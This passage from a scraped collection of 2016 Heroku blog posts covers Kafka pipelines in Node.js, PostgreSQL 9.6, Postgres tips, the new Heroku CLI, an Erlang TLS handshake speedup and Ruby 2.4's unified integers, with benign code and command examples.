Accounts, and Contacts. Because this data inherently belongs in Salesforce, Heroku Connect synchronization is the preferred solution. With Heroku Connect, you can configure high-scale, low latency data synchronization between Salesforce and Postgres in a handful of mouse clicks. Postgres as source of truth scenarios typically require exposing discrete, contextually informed data points, such as an order detail, external status, or computed metric within Salesforce. Physically copying this type of data into Salesforce would be inefficient and result in some degree of latency. Heroku External Objects allows data in Postgres to be exposed as a Salesforce external object, which is queried on access to facilitate real-time integration. Heroku External Objects is the newest data integration service of Heroku Connect and available today with Heroku Connect. For more information and documentation, visit the Heroku Connect page , the Heroku Dev Center or the documentation on Force.com . For more information on Salesforce Connect, head on over to the Trailhead . Heroku Connect Heroku External Objects salesforce Force.com", "date": "2016-11-15,"},
{"website": "Heroku", "title": "Apache Kafka, Data Pipelines, and Functional Reactive Programming with Node.js", "author": ["Chris Castle"], "link": "https://blog.heroku.com/kafka-data-pipelines-frp-node", "abstract": "Apache Kafka, Data Pipelines, and Functional Reactive Programming with Node.js Posted by Chris Castle November 29, 2016 Listen to this article Heroku recently released a managed Apache Kafka offering. As a Node.js developer, I wanted to demystify Kafka by sharing a simple yet practical use case with the many Node.js developers who are curious how this technology might be useful. At Heroku we use Kafka internally for a number of uses including data pipelines .  I thought that would be a good place to start. When it comes to actual examples, Java and Scala get all the love in the Kafka world.  Of course, these are powerful languages, but I wanted to explore Kafka from the perspective of Node.js.  While there are no technical limitations to using Node.js with Kafka, I was unable to find many examples of their use together in tutorials, open source code on GitHub, or blog posts.  Libraries implementing Kafka’s binary (and fairly simple) communication protocol exist in many languages, including Node.js.  So why isn’t Node.js found in more Kafka projects? I wanted to know if Node.js could be used to harness the power of Kafka, and I found the answer to be a resounding yes. Moreover, I found the pairing of Kafka and Node.js to be more powerful than expected.  Functional Reactive Programming is a common paradigm used in JavaScript due to the language’s first-class functions , event loop model, and robust event handling libraries.  With FRP being a great tool to manage event streams, the pairing of Kafka with Node.js gave me more granular and simple control over the event stream than I might have had with other languages. Continue reading to learn more about how I used Kafka and Functional Reactive Programming with Node.js to create a fast, reliable, and scalable data processing pipeline over a stream of events. The Project I wanted a data source that was simple to explain to others and from which I could get a high rate of message throughput, so I chose to use data from the Twitter Stream API, as keyword-defined tweet streams fit these needs perfectly. Fast, reliable, and scalable.  What do those mean in this context? Fast.  I want to be able to see data soon after it is received -- i.e. no batch processing. Reliable.  I do not want to lose any data.  The system needs to be designed for “at least once” message delivery, not “at most once”. Scalable.  I want the system to scale from ten messages per second to hundreds or maybe thousands and back down again without my intervention. So I started thinking through the pieces and drew a rough diagram of how the data would be processed. Each of the nodes in the diagram represents a step the data goes through.  From a very high level, the steps go from message ingestion to sorting the messages by keyword to calculating aggregate metrics to being shown on a web dashboard. I began implementation of these steps within one code base and quickly saw my code getting quite complex and difficult to reason about.  Performing all of the processing steps in one unified transformation is challenging to debug and maintain. Take a Step Back I knew there had to be a cleaner way to implement this.  As a math nerd, I envisioned a way to solve this by composing simpler functions -- maybe something similar to the POSIX-compliant pipe operator that allows processes to be chained together. JavaScript allows for various programming styles, and I had approached this initial solution with an imperative coding style.  An imperative style is generally what programmers first learn, and probably how most software is written (for good or bad).  With this style, you tell the computer how you want something done. Contrast that with a declarative approach in which you instead tell the computer what you want to be done.  And more specifically, a functional style, in which you tell the computer what you want done through composition of side-effect-free functions. Here are simple examples of imperative and functional programming.  Both examples result in the same value.  Given a list of integers, remove the odd ones, multiply each integer by 10, and then sum all integers in the list. Imperative const numList = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\nlet result = 0;\nfor (let i = 0; i < numList.length; i++) {\n  if (numList[i] % 2 === 0) {\n    result += (numList[i] * 10)\n  }\n} Functional const numList = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\nconst result = numList\n               .filter(n => n % 2 === 0)\n               .map(n => n * 10)\n               .reduce((a, b) => a + b, 0) Both complete execution with result equal to 300 , but the functional approach is much easier to read and is more maintainable. If that’s not readily apparent to you, here’s why: in the functional example, each function added to the “chain” performs a specific, self-contained operation.  In the imperative example, the operations are mashed together.  In the functional example, state is managed for me within each function, whereas I have to manage changing state (stored in the result variable) during execution in the imperative version. These may seem like small inconveniences, but remember this is just a simple example.  In a larger and more complex codebase the minor inconveniences like these accumulate, increasing the cognitive burden on the developer. The data processing pipeline steps were screaming to be implemented with this functional approach. But What About The Reactive Part? Functional reactive programming, “is a programming paradigm for reactive programming (asynchronous dataflow programming) using the building blocks of functional programming (e.g. map, reduce, filter)\" [ frp ].  In JavaScript, functional reactive programming is mostly used to react to GUI events and manipulate GUI data.  For example, the user clicks a button on a web page, the reaction to which is an XHR request which returns a chunk of JSON.  The reaction to the successfully returned chunk of JSON is a transformation of that data to an HTML list, which is then inserted into the webpage’s DOM and shown to the user.  You can see patterns like this in the examples provided by a few of the popular JavaScript functional reactive programming libraries: Bacon.js , RxJS , flyd . Interestingly, the functional reactive pattern also fits very well in the data processing pipeline use case.  For each step, not only do I want to define a data transformation by chaining functions together (the functional part), but I also want to react to data as it comes in from Kafka (the reactive part).  I don’t have the luxury of a fixed length numList .  The code is operating on an unbounded stream of values arriving at seemingly random times.  A value might arrive every ten seconds, every second, or every millisecond.  Because of this I need to implement each data processing step without any assumptions about the rate at which messages will arrive or the number of messages that will arrive. I decided to use the lodash utility library and Bacon.js FRP library to help with this.  Bacon.js describes itself as, “a small functional reactive programming lib for JavaScript. Turns your event spaghetti into clean and declarative feng shui bacon, by switching from imperative to functional... Stop working on individual events and work with event-streams instead [emphasis added]” [ bac ]. Kafka as the Stream Transport The use of event streams makes Kafka an excellent fit here.  Kafka’s append-only, immutable log store serves nicely as the unifying element that connects the data processing steps.  It not only supports modeling the data as event streams but also has some very useful properties for managing those event streams. Buffer : Kafka acts as a buffer, allowing each data processing step to consume messages from a topic at its own pace, decoupled from the rate at which messages are produced into the topic. Message resilience : Kafka provides tools to allow a crashed or restarted client to pick up where it left off.  Moreover, Kafka handles the failure of one of its servers in a cluster without losing messages. Message order : Within a Kafka partition , message order is guaranteed. So, for example, if a producer puts three different messages into a partition, a consumer later reading from that partition can assume that it will receive those three messages in the same order. Message immutability : Kafka messages are immutable.  This encourages a cleaner architecture and makes reasoning about the overall system easier.  The developer doesn’t have to be concerned (or tempted!) with managing message state. Multiple Node.js client libraries : I chose to use the no-kafka client library because, at the time, this was the only library I found that supported TLS (authenticated and encrypted) Kafka connections by specifying brokers rather than a ZooKeeper server.  However, keep an eye on all the other Kafka client libraries out there: node-kafka , kafka-node , and the beautifully named Kafkaesque .  With the increasing popularity of Kafka, there is sure to be much progress in JavaScript Kafka client libraries in the near future. Putting it All Together: Functional (and Reactive) Programming + Node.js + Kafka This is the final architecture that I implemented (you can have a look at more details of the architecture and code here ). Data flows from left to right.  The hexagons each represent a Heroku app.  Each app produces messages into Kafka, consumes messages out of Kafka, or both.  The white rectangles are Kafka topics. Starting from the left, the first app ingests data as efficiently as possible.  I perform as few operations on the data as possible here so that getting data into Kafka does not become a bottleneck in the overall pipeline.  The next app fans the tweets out to keyword- or term-specific topics.  In the example shown in the diagram above, there are three terms. The next two apps perform aggregate metric calculation and related term counting.  Here’s an example of the functional style code used to count the frequency of related terms.  This is called on every tweet. function wordFreq(accumulator, string) {\n  return _.replace(string, /[\\.!\\?\"'#,\\(\\):;-]/g, '') //remove special characters\n    .split(/\\s/)\n    .map(word => word.toLowerCase())\n    .filter(word => ( !_.includes(stopWords, word) )) //dump words in stop list\n    .filter(word => ( word.match(/.{2,}/) )) //dump single char words\n    .filter(word => ( !word.match(/\\d+/) )) //dump all numeric words\n    .filter(word => ( !word.match(/http/) )) //dump words containing http\n    .filter(word => ( !word.match(/@/) )) //dump words containing @\n    .reduce((map, word) =>\n      Object.assign(map, {\n        [word]: (map[word]) ? map[word] + 1 : 1,\n      }), accumulator\n    )\n} A lot happens here, but it’s relatively easy to scan and understand.  Implementing this in an imperative style would require many more lines of code and be much harder to understand (i.e. maintain).  In fact, this is the most complicated data processing step.  The functional implementations for each of the other data processing apps are even shorter. Finally, a web application serves the data to web browsers with some beautiful visualizations. Summary Hopefully, this provided you with not only some tools but also the basic understanding of how to implement a data processing pipeline with Node.js and Kafka.  We at Heroku are really excited about providing the tools to make evented architectures easier to build out, easier to manage, and more stable. If you are interested in deploying production Apache Kafka services and apps at your company, check out our Apache Kafka on Heroku Dev Center Article to get started. kafka node.js data processing events functional reactive programming javascript", "date": "2016-11-29,"},
{"website": "Heroku", "title": "PostgreSQL 9.6 Now Generally Available on Heroku ", "author": ["Rimas Silkaitis"], "link": "https://blog.heroku.com/postgresql-96-general-availability", "abstract": "PostgreSQL 9.6 Now Generally Available on Heroku Posted by Rimas Silkaitis December 01, 2016 Listen to this article PostgreSQL 9.6 is now generally available for Heroku Postgres . The main focus of this release is centered around performance. PostgreSQL 9.6 includes enhanced parallelism for key capabilities that sets the stage for significant performance improvements for a variety of analytic and transactional workloads. With 9.6, certain actions, like individual queries, can be split up into multiple parts and performed in parallel. This means that everything from running queries, creating indexes, and sorting have major improvements that should allow a number of different workloads to execute faster than they had in prior releases of PostgreSQL. With 9.6, the PostgreSQL community, along with Heroku’s own open source contributions to this release (a special thanks to Peter Geoghegan), have laid the foundation to bring those enterprise-class features to the world’s most advanced open source relational database. Parallelism, Performance, and Scale Performance in the form of parallelism means that more work can be done at the same time. One of the areas where this makes a big difference is when Postgres needs to scan an entire table to generate a resultset. Imagine for a moment that your PostgreSQL installation has a table in it called emails that stores all of the emails being sent by customers within an application. Let’s say that one of the features that’s provided to customers as part of the application is giving counts on the number of emails being sent to particular email addresses, filtered by the type of person that’s receiving the email. That query might look something like this: SELECT e.to\n     , count(*) as total\n  FROM emails e\n WHERE e.person_type = ‘executives’\n GROUP BY e.to In this scenario, if our customers have been sending a large number of emails to executives, an index on the table would not help on person_type column because rows with executive in the person_type column represent too many of the rows in the table. In that case, PostgreSQL will resort to scanning all of the rows in the database to find matches for executives . For relatively small tables, say thousands of rows, PostgreSQL might be able to perform this quickly. But, if the table has 100 million rows or more, that query will slow to a crawl because it needs to scan every single row. In the 9.6 release, PostgreSQL will be able to break apart the above query and search portions of the table at the same time. This should greatly speed up queries that require full table scans, which happens more often than you think in analytics-based workloads. The performance improvements in 9.6 weren’t limited to sequential scans on large tables. Much of the work Heroku contributed to this release was in the way of improved sorting . One of the areas where you’ll see considerable improvement is when you create indexes concurrently. Under the hood, each row in a table has what’s called a Tuple Id (TID), not to be confused with an Object Id . A TID consists of two parts, a block and a row index. Together, the TID identifies where the row can be found within the physical structure of the table. Our patch to this code took the tuple ids and transformed them into a different format prior to sorting in the index which would allow PostgreSQL to sort the TIDs even faster. With our contributions to sorting, when you want to create an index concurrently by using the CREATE INDEX CONCURRENTLY syntax , you can experience up to a 50% performance improvement on index creation in certain cases. This is an amazing patch because when CREATE INDEX CONCURRENTLY is used, it won’t lock writes to the table in question like CREATE INDEX would. This allows your application to operate like it normally would without adverse effects. Notable Improvements Beyond the work done on parallelism, PostgreSQL 9.6 has a number of noteworthy improvements: PostgreSQL foreign data wrapper now supports remote updates, joins and batch updates. That you can distribute workloads across many different PostgreSQL instances. Full text search can now search for adjacent words. Improvements to administrative tasks like VACUUM which shouldn’t scan pages unnceccesarily. This is particularly useful for tables that are append-only like events or logs . Getting Started When a new Heroku Postgres database is provisioned on any one of the Heroku plan tiers, whether on the Common Runtime or in Private Spaces, 9.6 will be the default version. If you have an existing database on the platform, please check out our documentation for upgrading .  This is an exciting update to PostgreSQL that should have many benefits for the workloads that run on Heroku. Give PostgreSQL 9.6 a spin and let us know how we can make PostgreSQL even better. Together, we can make PostgreSQL one of the best relational databases in the business! postgres", "date": "2016-12-01,"},
{"website": "Heroku", "title": "A Few Postgres Essentials", "author": ["Timothée Peignier"], "link": "https://blog.heroku.com/postgres-essentials", "abstract": "A Few Postgres Essentials Posted by Timothée Peignier December 08, 2016 Listen to this article Postgres is our favorite database—it’s reliable, powerful and secure. Here are a few essential tips learned from building, and helping our customers build, apps around Postgres. These tips will help ensure you get the most out of Postgres, whether you’re running it on your own box or using the Heroku Postgres add-on. Use a Connection Pooler Postgres connections are not free , as each established connection has a cost. By using a connection pooler, you’ll reduce the number of connections you use and reduce your overhead. Most Postgres client libraries include a built-in connection pooler; make sure you’re using it. You might also consider using our pgbouncer buildpack if your application requires a large number of connections. PgBouncer is a server-side connection pooler and connection manager that goes between your application and Postgres. Check out some of our documentation for using PgBouncer for Ruby and Java apps. Set an Application Name Postgres allows you to see what clients are connected and what each of them is doing using the built-in pg_stat_activity table. By explicitly marking each connection you open with the name of your dyno, using the DYNO environment variable, you’ll be able to track what your application is doing at a glance: SET application_name TO 'web.1'; Now, if you will be to quickly see what each dyno is doing, using heroku pg:ps : $ heroku pg:ps\nprocpid |         source            |   running_for   | waiting |         query\n---------+---------------------------+-----------------+---------+-----------------------\n   31776 | web.1      | 00:19:08.017088 | f  | <IDLE> in transaction\n   31912 | worker.1   | 00:18:56.12178  | t  | select * from customers;\n(2 rows) You will also be able to see how many connections each dyno is using, and much more, by querying the pg_stat_activity table: $ heroku pg:psql\nSELECT application_name, COUNT(*) FROM pg_stat_activity GROUP BY application_name ORDER BY 2 DESC;\n      application_name      | count \n----------------------------+-------\n web.1         |     15\n web.2         |     15\n worker.1      |     5\n(3 rows) Set a statement_timeout for Web Dynos Long running queries can have an impact on your database performance because they may hold locks or over-consume resources. To avoid them, Postgres allows you to set a timeout per connection that will abort any queries exceeding the specified value.\nThis is especially useful for your web dynos, where you don’t want any requests to run longer than your request timeout . SET statement_timeout TO '30s'; Track the Source of Your Queries Being able to determine which part of your code is executing a query makes optimization easier, and makes it easier to track down expensive queries or n+1 queries. There are many ways to track which part of your code is executing a query, from a monitoring tool like New Relic to simply adding a comment to your SQL specifying what code is calling it: SELECT  `favorites`.`product_id` FROM `favorites` -- app/models/favorite.rb:28:in `block in <class:Favorite>' You will now be able to see the origin of your expensive queries , and be able to track down the caller of the query when using the pg_stat_statements and pg_stat_activity tables: $ heroku pg:psql\nSELECT (total_time/sum(total_time) OVER()) * 100 AS exec_time, calls, query FROM pg_stat_statements ORDER BY total_time DESC LIMIT 10;\n----------------------------------------------------------------------------------------------------------------------------\nexec_time | 12.2119460729825\ncalls     | 7257\nquery     | SELECT  `favorites`.`product_id` FROM `favorites` -- app/models/product.rb:28:in `block in <class:Product>' Many ORMs provide this feature built-in or via extensions , make sure you use it and your debugging and optimization will be easier. Learn More There is much more you can learn about Postgres, either via the excellent documentation of the project itself, or the Heroku Postgres Dev Center reference . Share your own tips with the community on the #postgrestips hashtag. postgres", "date": "2016-12-08,"},
{"website": "Heroku", "title": "Announcing the New Heroku CLI: Performance and Readability Enhancements ", "author": ["Nahid Samsami"], "link": "https://blog.heroku.com/the-new-heroku-cli", "abstract": "Announcing the New Heroku CLI: Performance and Readability Enhancements Posted by Nahid Samsami December 15, 2016 Listen to this article Today we are announcing the newest version of the Heroku CLI . We know how much time you spend in the CLI as developers and how much pride you take in being able to get things done quickly. Our new CLI has big improvements in performance as well as enhanced readability for humans and machines. Tuned for Performance CLI response time is made up of two parts: the API response time and the performance of the CLI itself, and the latter is where we’ve made big improvements. While a typical Unix user should experience responses that are around half a second faster, the biggest gains are for Windows users, as the new CLI no longer has a Ruby wrapper. When we measured the time it takes for the info command in the old vs. new CLI, it decreases from 1690 to 1210 milliseconds in Unix, and 3409 to 944 milliseconds in Windows! Though individual results will vary, you should experience faster response times on average across all commands. Installing the New CLI You might have noticed some improvements over the last few months, but to get the fastest version you’ll need to uninstall and reinstall the CLI, because we’ve rewritten it in Node.js with new installers. The good news is that this should be the last manual update you’ll ever do for the Heroku CLI: the new CLI will auto-update in the future. The instructions to uninstall for Mac OS X users are to type the following: $ rm -rf /usr/local/heroku\n$ rm -rf ~/.heroku ~/.local/share/heroku ~/.config/heroku ~/.cache/heroku Then download and run the OS X installer . On Windows, to uninstall the Heroku CLI: Click Start > Control Panel > Programs > Programs and Features . Select Heroku CLI, and then click Uninstall . Delete the .config/heroku directory inside your home directory. Then download and run the Windows installer. For the last few of you who are still using our very old Ruby gem - now is a great time to upgrade to the full Heroku CLI experience. Please let us know if you run into any issues with installation as we’re here to help! Improved Readability for Humans and Machines The new CLI includes a number of user experience improvements that we’ve been rolling out over the past few months. Here are some of our favorites. grep-parseable Output We’ve learned that while you value human-readable output, you want grep -parseable output too. We’ve standardized the output format to make it possible to use grep . For example, let’s look at heroku regions . heroku regions at one point showed output like the following: While this shows all the information about the available regions, and is arguably more readable for humans as it groups the two regions underneath their respective headers, you lose the ability to use grep to filter the data. Here is a better way to display this information: Now you can use grep to filter just common runtime spaces: Power Up with the jq Tool If you want even better tools to work with a richer CLI output, many commands support a --json flag. Use the powerful jq tool to query the results. $ heroku We noticed that heroku was one of the top commands users run. We learned that many users were running it to get a holistic overview of their account. We re-ordered the output so it would be in an order that would make sense to you - and showing your starred apps first. We also added context that would give you a Dashboard-style view of the current state of those apps and how they fit into the bigger picture, including pipeline info, last release info, metrics, and errors. At the end of the output, we give guidance on where you might want to go next - such as viewing add-ons or perhaps apps in a particular org. Colors We’ve used color to help you quickly read command output. We’ve given some nouns in the CLI standard colors , so that you’ll easily spot them. In the example above you’ll notice that apps are purple, example commands are in blue, and the number of unread notifications is green. We typically specify errors and warning messages in yellow and red. We’ve tried to be mindful with color. Too many contrasting colors in the same place can quickly begin to compete for attention and reduce readability. We also make sure color is never the only way we communicate information. You can always disable color as a user, by adding --no-color or setting COLOR=false. Input Commands: Flags and Args Our new CLI makes greater use of flags over args. Flags provide greater clarity and readability, and give you confidence that you are running the command correctly. An old heroku fork command would look like this: $ heroku fork destapp -a sourceapp Which app is being forked and which app is the destination app? It’s not clear. The new heroku fork has required flags: $ heroku fork --from sourceapp --to destapp The input flags specify the source and destination with --from and --to so that it’s very clear. You can specify these flags in any order, and still be sure that you will get the correct result. Looking to the future, flags will allow us to provide autocomplete in a much better fashion than args. This is because when the user types: $ heroku info --app <tab><tab> ...we know without question that the next thing to complete is an app name and not another flag or other type of argument. Learn More These are just some examples of the work we’ve been doing to standardize and improve the Heroku CLI user experience. You can read more in the Heroku Dev Center CLI article . We’ve also published a CLI style guide that documents our point of view on CLI design and provides a clear direction for designing delightful CLI plugins. As always, we love getting feedback from you so try out the new CLI and let us know your thoughts . CLI command line UX node user experience", "date": "2016-12-15,"},
{"website": "Heroku", "title": "How We Sped up SNI TLS Handshakes by 5x", "author": ["Fred Hebert"], "link": "https://blog.heroku.com/how-we-sped-up-sni-tls-handshakes-by-5x", "abstract": "How We Sped up SNI TLS Handshakes by 5x Posted by Fred Hebert December 22, 2016 Listen to this article During the development of the recently released Heroku SSL feature, a lot of work was carried out to stabilize the system and improve its speed. In this post, I will explain how we managed to improve the speed of our TLS handshakes by 4-5x. The initial reports of speed issues were sent our way by beta customers who were unhappy about the low level of performance. This was understandable since, after all, we were not greenfielding a solution for which nothing existed, but actively trying to provide an alternative to the SSL Endpoint add-on, which is provided by a dedicated team working on elastic load balancers at AWS. At the same time, another of the worries we had was to figure out how many more routing instances we would need to absorb the CPU load of a major part of our traffic no longer being simple HTTP, but HTTP + TLS. Detecting the Problem The simplest way to work at both of these things is always through benchmarking. So we set up some simple benchmarks that used TLS with no session resumption or caching, and on HTTP requests that were extremely small with no follow-up requests coming over the connection. The objective there was to specifically exercise handshakes: TLS handshakes are more costly than just encrypting data over a well-established connection. HTTP keep-alive requests reuse the connection and the first one is technically more expensive (since it incurs the cost of the handshake), so we disabled them to always have the most expensive thing happening. Small amounts of data to encrypt mean that the weight of the handshake dominates the overall amount of time taken for each query. We wanted more handshakes and less of everything else. Under such benchmarks, we found that our nodes became slow and unresponsive at a depressingly rapid rate, almost 7-8 times earlier than with the same test over HTTP. This is a far cry from reported overheads of 1%-2% in places like google , although we purposefully went with a very pessimistic pattern. A more realistic pattern would likely have had lower overhead. This could have easily have been a call for panic. We had used the Erlang/OTP SSL libraries to serve our traffic.  While there's some added safety to having a major part of your stack not written in C and not dependent on OpenSSL, which recently has experienced several notable vulnerabilities , we did run the risk of much worse performance. To be clear, the Erlang SSL library does use OpenSSL bindings for all of the cryptographic functionality but uses Erlang for protocol-level parts of the implementation, such as running state machines. The library has gone through independent audit and testing. We have a team of people who know Erlang pretty well and are able to profile and debug it, so we decided to see if we could resolve the performance issue just tweaking standard configurations. During initial benchmarking, we found that bandwidth and packet counts were very low and memory usage was as expected. CPU usage was fairly low (~30%) but did tend to jump around quite a bit. For us, this pointed to a standard kind of bottleneck issue where you see flapping as some work gets done in a batch, then the process waits, then does more work. However, from our internal tools, we could see very little that was not just SSL doing work. Eventually, we used perf top to look at things, which is far less invasive than most tooling out there (if you're interested, you should take a look at Julian Squire's talk at the Erlang User Conference 2016 on this specific topic ). The thing that immediately jumped out at us was that a bunch of functions were taking far more time than we'd expect. Specifically, the following results would show up: The copy_shallow and do_minor functions are related to garbage collection operations within the Erlang VM. They can be high in regular circumstances, but here they were much, much higher than expected. In fact, GC was taking more time than actual crypto work! The other thing that took more time than crypto was the db_next_hash function, which was a bit funny. We looked some more, and as more samples came out, the pattern emerged: CPU time would flap a lot between a lot of garbage collection operations and a lot of db_*_hash operations, whereas given the benchmark, we would have expected libcrypto.so to do the most work. The db_*_hash operations are specifically related to something called ETS (Erlang Term Storage) tables. ETS tables are an efficient in-memory database included with the Erlang virtual machine. They sit in a part of the virtual machine where destructive updates are allowed and where garbage collection dares not approach. They're generally fast, and a pretty easy way for Erlang programmers to optimize some of their code when parts of it get too slow. In this case, though, they appeared to be our problem. Specifically, the next and get operations are expected to be cheap, but select tends to be very expensive and a sign of full-table scans. By logging onto the node during the benchmark, we could make use of Erlang's tracing facilities. The built-in tracing functions basically let an operator look at all messages, function calls and function returns, garbage collections, scheduling activities, data transiting in and out of ports, and so on, at the language level.  This tracing is higher level than tracing provided by tools such as strace or dtrace. We simply ran calls to recon_trace:calls({ets, select_delete, '_'}, 100) and saw that all of the calls came from a single process named ssl_manager . Understanding and Fixing the Problem The SSL manager in the Erlang library has been a potential bottleneck for a long period of time. Prior to this run, we had already disabled all kinds of cache implementations that turned out to be slower for our use cases. We had also identified this lone, central process as a point of contention by design -- we have a few of them and tend to know about them as specific load scenarios exercise them more than others. The tracing above had also shown that the trace calls were made from a module called ssl_pkix_db , which is in turn called by ssl_manager . These modules were used by the SSL implementation as a cache for intermediary certificates for each connection. The initial intent was to cache certificates read from disk by Erlang, say from /etc/ssl/ . For us, this would have been costly when the server is fetching the files from disk hundreds or thousands of times a second, decoding them from PEM to DER format, and subsequently to their internal Erlang format . The cache was set in place such that as soon as one connection requested a given file, it would get decoded once, and then cached in memory through ETS tables with a reference count. Each new session would increment the count, and each terminated session would decrement the count. When the count reaches 0, the cache is dropped. Additional table scans would take place to provide upper time limits for caches. The cache was then used for other operations, such as scanning through CA certs during revocation checks. The funny bit there is that the SSL library supports an entire other format to handle certificates: have the user decode the PEM data to the DER format themselves and then submit the DER data directly in memory through the connection configuration. For dynamic routers such as Heroku's, that's the method we've taken to avoid storing multiple certificates on disk unencrypted. We store them ourselves, using appropriate cryptographic means, and then decode them only once they are requested through SNI, at which point they are passed to the SSL library. For this use case, the SSL library has certificates passed straight in memory and does not require file access. Still, the same caching code path was used.  The certificates are cached but not reference-counted and also not shared across connections either. For heavy usage of DER-encoded certificates, the PEM cache, therefore, becomes a central bottleneck for the entire server, forcing the decoding of every certificate individually through that single critical process. Patching Results We decided to write a very simple patch whose purpose is just to bypass the cache wholesale, nothing more. Once the patch was written, we needed to test it. We ran it through our benchmark sequence and the capacity of each instance instantly tripled, with response times now much lower than before. It soon came to the step of sending our first canary nodes into production to see how they'd react with real-world data rather than benchmark cases. It didn't take too long to see the improvements: The latencies on the node for all SSL/TLS queries over SNI had instantly dropped by 400% to 500% -- from 100-120 milliseconds roundtrip down to a range of 20-25 milliseconds for the particular subset of apps we were looking at. That was a lot of overhead. In fact, the canary node ran for a while and beat every other node we had on the platform: It seemed a bit surprising that so much time was spent only through the bottleneck, especially since our benchmark case was more pessimistic than our normal production load. Then we looked at garbage collection metrics: The big dip in the middle is the node restarting to run the new software. What's interesting is that as soon as the new version was used, the garbage collection count went from about 3 million GCs per minute down to roughly 2.5 million GCs per minute. The reclaimed words are impacted more significantly: from around 7 billion words reclaimed down to 4 billion words reclaimed per minute. Since Erlang garbage collections are per-process, non-blocking, and generational, it is expected to see a lot of small garbage collections and a few larger ones. The overall count includes both values. Each garbage collection tends to take a very short time. What we know for a fact, though, is that we had this one bottleneck of a process and that a lot of time was saved. The supposition is that because a lot of requests (in fact, all of the SNI termination requests) had to touch this one Erlang process, it would have time to accumulate significant amounts of garbage for short periods of time. This garbage collection impacted the latency of this process and the scheduler it was on, but not the others; processes on other cores could keep running fine. This yielded a pattern where a lot of data coming from the other 15 cores could pile up into the message queue of the SSL manager, up to the point that memory pressure forced it to GC more and more often. At regular intervals, a more major GC would take place, and stall an even larger number of requests. By removing the one small bottleneck, the level of garbage generated was more equally shared by all callers and also tended to be much more short-lived. In fact, if the caller was a short-lived process, its memory would be reclaimed on termination without any garbage collection taking place. The results were so good that we rapidly deployed them to the rest of the platform: Those values represented the median (orange), the 95th percentile (blue), and the 99th percentile (green). You can see the progression of the deploy as the median rapidly shrinks, and the point where the deploy finishes when the 99th percentile responses became faster than our previous medians. The patch has been written, tested, cleaned up, and sent upstream to the OTP team at Ericsson ( see the pull request ). It has recently been shipped along with Erlang OTP-19.1, and everyone can now use it in the releases starting then. ssl performance", "date": "2016-12-22,"},
{"website": "Heroku", "title": "Ruby 2.4 Released: Faster Hashes, Unified Integers and Better Rounding", "author": ["Jonan Scheffler"], "link": "https://blog.heroku.com/ruby-2-4-features-hashes-integers-rounding", "abstract": "Ruby 2.4 Released: Faster Hashes, Unified Integers and Better Rounding Posted by Jonan Scheffler December 25, 2016 Listen to this article The Ruby maintainers continued their annual tradition by gifting us a new Ruby version to celebrate the holiday: Ruby 2.4 is now available and you can try it out on Heroku . Ruby 2.4 brings some impressive new features and performance improvements to the table, here are a few of the big ones: Binding#irb - Runtime Invocation for IRB Unified Integers - Fixnum and Bignum are now Integer Rounding Changes - More Accurate Kernel#sprintf Rounding Background: 32-bit vs 64-bit Word Length C Data Models Fixnum Sizes Across Rubies Proposed Changes Gaussian Rounding Hash Changes - Open Addressing for Cache Utilization via Full Cycle LCG Background: Processor Caching A DIY Hash : TurboHash Open Addressing Linear Probing The Linear Congruential Generator Binding#irb Have you ever used p or puts to get the value of a variable in your code? If you’ve been writing Ruby the odds are pretty good that you have. The alternative REPL Pry ( http://pryrepl.org/ ) broke many of us of this habit, but installing a gem to get a REPL during runtime isn’t always an option, or at least not a convenient one. Enter binding.irb , a new native runtime invocation for the IRB REPL that ships with Ruby. Now you can simply add binding.irb to your code to open an IRB session and have a look around: # ruby-2.4.0\nclass SuperConfusing\n  def what_is_even_happening_right_now\n    @x = @xy[:y] ** @x\n\n    binding.irb\n    # open a REPL here to examine @x, @xy,\n    # and possibly your life choices\n  end\nend One Integer to Rule Them All Ruby previously used 3 classes to handle integers: the abstract super class Integer , the Fixnum class for small integers and the Bignum class for large integers. You can see this behavior yourself in Ruby 2.3: # ruby-2.3.3\nirb> 1.class\n# => Fixnum\nirb> (2**100).class\n# => Bignum\nirb> Fixnum.superclass\n# => Integer\nirb> Bignum.superclass\n# => Integer Ruby 2.4 unifies the Fixnum and Bignum classes into a single concrete class Integer : # ruby-2.4.0\nirb> 1.class\n# => Integer\nirb> (2**100).class\n# => Integer Why Did We Ever Have Two Classes of Integer? To improve performance Ruby stores small numbers in a single native machine word whenever possible, either 32 or 64 bits in length depending on your processor. A 64-bit processor has a 64-bit word length; the 64 in this case describes the size of the registers on the processor. The registers allow the processor to handle simple arithmetic and logical comparisons, for numbers up to the word size, by itself; which is much faster than manipulating values stored in RAM. On my laptop it's more than twice as fast for me to add 1 to a Fixnum a million times than it is to do the same with a Bignum : # ruby-2.3.3\nrequire \"benchmark\"\n\nfixnum = 2**40\nbignum = 2**80\n\nn = 1_000_000\n\nBenchmark.bm do |x|\n  x.report(\"Adding #{fixnum.class}:\") { n.times { fixnum + 1 } }\n  x.report(\"Adding #{bignum.class}:\") { n.times { bignum + 1 } }\nend\n\n# =>\n#                     user     system      total        real\n# Adding Fixnum:  0.190000   0.010000   0.200000 (  0.189790)\n# Adding Bignum:  0.460000   0.000000   0.460000 (  0.471123) When a number is too big to fit in a native machine word Ruby will store that number differently, automatically converting it to a Bignum behind the scenes. How Big Is Too Big? Well, that depends. It depends on the processor you’re using, as we’ve discussed, but it also depends on the operating system and the Ruby implementation you’re using. Wait It Depends on My Operating System? Yes, different operating systems use different C data type models. When processors first started shipping with 64-bit registers it became necessary to\naugment the existing data types in the C language, to accommodate larger register\nsizes and take advantage of performance increases. Unfortunately, The C language doesn't provide a mechanism for adding new fundamental data types.\nThese augmentations had to be accomplished via alternative data models like LP64, ILP64 and LLP64. LL-What Now? LP64, IL64 and LLP64 are some of the data models used in the C language. This is\nnot an exhaustive list of the available C data models but these are the most common. The first few characters in each of these acronyms describe the data types they affect.\nFor example, the \"L\" and \"P\" in the LP64 data model stand for long and pointer ,\nbecause LP64 uses 64-bits for those data types. These are the sizes of the relevant data types for these common data models: |       | int | long | long long | pointer |\n|-------|-----|------|-----------|---------|\n| LP64  | 32  | 64   | NA        | 64      |\n| ILP64 | 64  | 64   | NA        | 64      |\n| LLP64 | 32  | 32   | 64        | 64      | Almost all UNIX and Linux implementations use LP64, including OS X. Windows uses\nLLP64, which includes a new long long type, just like long but longer. So the maximum size of a Fixnum depends on your processor and your operating\nsystem, in part. It also depends on your Ruby implementation. Fixnum Size by Ruby Implementation | Fixnum Range         | MIN             | MAX              |\n|----------------------|-----------------|------------------|\n| 32-bit 